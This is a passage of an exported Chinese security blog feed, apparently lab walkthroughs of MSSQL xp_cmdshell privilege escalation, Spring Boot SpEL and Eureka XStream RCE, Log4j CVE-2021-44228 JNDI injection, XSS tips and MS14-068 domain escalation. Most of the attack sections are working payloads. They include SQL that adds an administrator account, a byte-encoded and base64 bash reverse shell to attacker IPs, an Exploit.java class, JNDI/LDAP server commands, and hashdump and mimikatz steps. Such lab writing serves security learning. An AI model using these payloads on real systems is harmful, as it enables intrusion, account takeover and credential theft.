class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182942969.png" alt="image-20240215182942969"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;ver&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183026173.png" alt="image-20240215183026173"></p><p>没有报错说明成功运行</p><p>0x05 利用xp_cmdshell进行提取，也就是在目标服务器新建一个账户。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;net user name password /add&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183141883.png" alt="image-20240215183141883"></p><p>执行发现并没有报错</p><p>0x06  添加用户到管理员组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;net localgroup administrators name /add&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183307294.png" alt="image-20240215183307294"></p><p>但是这个是内有回显的</p><p>0x07 检测</p><p>由于这个是本机搭建的环境所以我们本机访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183855762.png" alt="image-20240215183855762"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183912072.png" alt="image-20240215183912072"></p><p>已经成功的提权了</p><p>前面发现可以通过xp_cmdshell 可以执行命令，如果我们执行payload 就直接获取的shell </p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>springBoot漏洞整理</title>
    <link href="/2024/02/14/%E6%95%B4%E7%90%86/springBoot%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/14/%E6%95%B4%E7%90%86/springBoot%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="springboot-spel-rce"><a href="#springboot-spel-rce" class="headerlink" title="springboot-spel-rce"></a>springboot-spel-rce</h1><p>0x00  漏洞发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214180957037.png" alt="image-20240214180957037"></p><p>这个是模拟的查找的书的一个页面</p><p>发现存在漏洞，因为6*2 已经被计算了</p><p>0x01</p><p>尝试利用这个漏洞</p><p>攻击者使用nc 开启监听</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214181250306.png" alt="image-20240214181250306"></p><p>构造一个反弹shell 的指令</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214181324669.png" alt="image-20240214181324669"></p><p>将这个构造成字节码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214181613443.png" alt="image-20240214181613443"></p><p>然后构造payload 发送</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.79</span><span class="hljs-number">.128</span>:<span class="hljs-number">9091</span>/article/?id=$&#123;T(java<span class="hljs-number">.</span>lang<span class="hljs-number">.</span>Runtime).getRuntime().exec(new String(new <span class="hljs-built_in">byte</span>[]&#123;<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x7d</span>&#125;))&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214182006023.png" alt="image-20240214182006023"></p><p>利用成功</p><h1 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h1><p>0x00</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214185527658.png" alt="image-20240214185527658"></p><p>发现是springboot 尝试抓个包</p><p>0x01</p><p>开启监听</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214190332438.png" alt="image-20240214190332438"></p><p>开启恶意的服务器</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214190400544.png" alt="image-20240214190400544"></p><p>记得修改成自己反弹的主机</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214190257877.png" alt="image-20240214190257877"></p><p>开启成功</p><p>0x02</p><p>尝试攻击</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214190525831.png" alt="image-20240214190525831"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214190520552.png" alt="image-20240214190520552"></p><p>判断版本是1</p><p>直接使用payload </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http:<span class="hljs-comment">//192.168.79.1:9999/example</span><br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>就会发现已经反弹了</p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2漏洞整理</title>
    <link href="/2024/02/14/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/14/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><p>0x00 漏洞发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214160156423.png" alt="image-20240214160156423"></p><p>发现这个，然后尝试验证是否存在漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214160344481.png" alt="image-20240214160344481"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>IP地址:端口<span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/9xovk0.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure><p>指定ip 端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214161647753.png" alt="image-20240214161647753"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214161640213.png" alt="image-20240214161640213"></p><p>发现已经被解析</p><p>尝试测试java 版本</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214161857301.png" alt="image-20240214161857301"></p><p>0x01</p><p>发现可以使用jndi 注入的方式进行利用</p><p>使用攻击机监听端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214162324084.png" alt="image-20240214162324084"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214162034629.png" alt="image-20240214162034629"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//javac Exploit.java</span><br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.79.138/19999 0&gt;&amp;1&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用修改为自己的ip和端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214162154247.png" alt="image-20240214162154247"></p><p>编译对应的java 文件为class 文件，然后开启http服务</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214162238290.png" alt="image-20240214162238290"></p><p>然后开启ldap 服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://120.27.61.239:8000/#Exploit&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214162440448.png" alt="image-20240214162440448"></p><p>0x02</p><p>尝试让受害者访问并且加载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.128</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.168.79.1:9999/</span>Exploit&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214163130015.png" alt="image-20240214163130015"></p><p>反弹成功</p><p>0x03</p><p>尝试其他方法</p><p>也就是生成payload 的方式不一样，本质都是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp fastjson_tool.jar fastjson.HLDAPServer <span class="hljs-number">192.168.79.1</span> <span class="hljs-number">9999</span>  <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8xOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214164156617.png" alt="image-20240214164156617"></p><p>这个方式就是少了一个手动开启http的过程</p><p>注意这个是Object</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.128</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.168.79.1:9999/</span>Object&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214164233522.png" alt="image-20240214164233522"></p><p>0x04</p><p>使用专门的工具进行利用，本质也是开启开启一个ldap服务而已</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar .\JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8xOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="hljs-number">192.168.79.1</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214164642320.png" alt="image-20240214164642320"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/log4j2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240214170011595.png" alt="image-20240214170011595"></p><p>也是成功的反弹</p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂记</title>
    <link href="/2024/02/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%9D%82%E8%AE%B0/"/>
    <url>/2024/02/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%9D%82%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="遇到的方法集合"><a href="#遇到的方法集合" class="headerlink" title="遇到的方法集合"></a>遇到的方法集合</h1><ol><li><p>能获取api 接口的情况之下，获取用户信息</p></li><li><p>文件上传漏洞，但是智能上传pdf</p></li></ol><p>   可以考虑上传svg,html,pdf 这个能执行js 脚本，可以实现储存型xss</p><ol start="3"><li><p>在登陆界面，尝试修改密码，看看是否可以修改其他人的密码 </p></li><li><p>获取验证码是否存在短信轰炸漏洞</p></li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>都说xss 是捡漏，但是捡漏也是漏洞</p><ol><li><p>发现会请求图片<br> 构造xss<br> 通过修改http_host部分</p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/1049983-20221205120119915-1550751559.jpg" alt="img"><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/1049983-20221205120120690-217287024.jpg" alt="img"></p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/1049983-20221205120121286-2038736915.jpg" alt="img"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域环境权限提升</title>
    <link href="/2024/02/14/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2024/02/14/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>域环境提权，就是从普通域用户权限到域控管理权限  </p><p>域渗透的主要目标就是拿下域控管理权限，拿下域控制器，进而拿下整个域</p></blockquote><p>域内的权限提升更像是横向移动，只要获取到了域控的权限就拿到了所有的主机</p><h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。  </p></blockquote><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>服务票据是客户端直接发送给服务器，并请求服务资源的。如果服务器没有向域控DC验证PAC的话，  那么客户端可以伪造域管的权限来访问服务器。</p></blockquote><p>这个就是黄金票据</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>域控没有安装MS14-068的补丁KB3011780  </li><li>拥有一台域内主机权限  </li><li>具有普通域用户密码、Hash值以及用户SUID</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li><p>漏洞检测</p><p>查看是否存在KB3011780 补丁来判断是否存在漏洞，一般在域中的漏洞补丁都是批量安装的</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic qfe</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103016798.png" alt="image-20240214103016798"></p><p>发现并不存在该补丁</p></li><li><p>收集sid值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103212163.png" alt="image-20240214103212163"></p><p>如果本身是system 的话出现的sid 会有点奇怪</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">105521541</span>-<span class="hljs-number">3531550336</span>-<span class="hljs-number">1849330903</span>-<span class="hljs-number">500</span><br>   <br></code></pre></td></tr></table></figure></li><li><p>获取域用户的hash </p><p>在这一步需要提权才行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getsystem</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103551078.png" alt="image-20240214103551078"></p><p>由于机器比较古老，基本都是一提一个准</p><p>然后获取hash</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103654660-17078782918081.png" alt="image-20240214103654660"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">august:</span><span class="hljs-number">1000</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br></code></pre></td></tr></table></figure></li><li><p>获取明文密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">logonpasswords</span><br></code></pre></td></tr></table></figure></li><li><p>重新制作当前的票据</p><p>删除原来的票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::purge<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214104528009.png" alt="image-20240214104528009"></p><p>生成认证证书之前我们需要先下载工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/abatchy17/</span>WindowsExploits<span class="hljs-regexp">/tree/m</span>aster/MS14-<span class="hljs-number">068</span><br></code></pre></td></tr></table></figure><p>然后将本机的工具上传到受害者的机器</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">upload <span class="hljs-name">D</span>:\tools\penetration\提权\windows\MS14<span class="hljs-number">-068.</span>exe .<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214105229558.png" alt="image-20240214105229558"></p><p>然后发现成功的上传，然后开始制作票据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 